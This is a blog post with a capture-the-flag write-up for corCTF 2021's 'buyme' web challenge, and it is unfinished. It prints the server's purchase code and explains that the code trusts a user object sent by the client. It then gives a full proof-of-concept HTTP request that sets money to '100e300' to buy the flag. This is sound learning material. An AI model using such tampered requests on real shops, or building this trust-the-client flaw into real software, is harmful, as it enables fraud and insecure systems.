---
layout: post
date: 2021-08-23 00:00:11
title: "corCTF 2021 Write Up"
categories: CTF
tags: [PHP, JS, Python Jail]
author:
  - Jeongwon Jo

---
## (Web) buyme [441 pts]

> This challenge is to buy a flag using a business logic bug

```js
const fs = require("fs");

const flags = new Map();
for(let flag of JSON.parse(fs.readFileSync("flags.json")).flags) {
    if(flag.name === "corCTF") {
        flag.text = process.env.FLAG || "corctf{test_flag}";
    }
    flags.set(flag.name, flag);
}

const users = new Map();

const buyFlag = ({ flag, user }) => {
    if(!flags.has(flag)) {
        throw new Error("Unknown flag");
    }
    if(user.money < flags.get(flag).price) {
        throw new Error("Not enough money");
    }

    user.money -= flags.get(flag).price;
    user.flags.push(flag);
    users.set(user.user, user);
};

module.exports = { flags, users, buyFlag };
```
Is defined a `buyFlag()` function and `users`/`flags` object in `db.js`. The `flags` object is to stored a flag list and `users` object is to save a user data. And the `buyFlag` function is to compare `user.money` and `flags.get(flag).price` and if `user.money` is greather than `flags.get(flag).price`, puts  flag into the user's flag store. The vulnerability that occurs here comes from the user's input, not the user's money from the db :(

```
POST /api/buy HTTP/1.1
Host: buyme.be.ax
Cookie: user=s%3Apocas.YkR5exl7JIrsxHuWU7qFW7qBCt59bx1u8fK7iFUi7yA
Content-Length: 70
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://buyme.be.ax
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://buyme.be.ax/flags
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{"user":{"money":"100e300","user":"pocas","flags":[]},"flag":"corCTF"}
```
So I sent a poc and I got the flag :)

(Writing)


---
